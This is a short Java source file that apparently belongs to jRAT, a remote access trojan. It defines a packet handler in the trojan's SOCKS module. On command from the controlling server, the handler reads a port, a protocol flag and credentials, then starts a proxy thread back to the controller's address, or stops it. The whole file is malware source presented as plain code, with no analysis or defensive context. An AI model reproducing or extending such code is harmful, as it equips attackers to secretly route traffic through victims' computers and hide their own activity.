package jrat.module.socks.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import jrat.module.socks.ServerThread;
import jrat.module.socks.SocksClientModule;

public class PacketControl implements IncomingPacket {

    public void read(Connection con) throws Exception {
        boolean start = con.readBoolean();

        if (start) {
            boolean socks5 = con.readBoolean();
            int port = con.readInt();
            boolean auth = con.readBoolean();
            String user = con.readLine();
            String pass = con.readLine();

            String host = con.getSocket().getInetAddress().getHostAddress();
            
            new ServerThread(host, port, user, pass, socks5, auth).start();
        } else {
            if (SocksClientModule.server != null) {
                SocksClientModule.server.stop();
                SocksClientModule.server = null;
            }
        }
    }
}
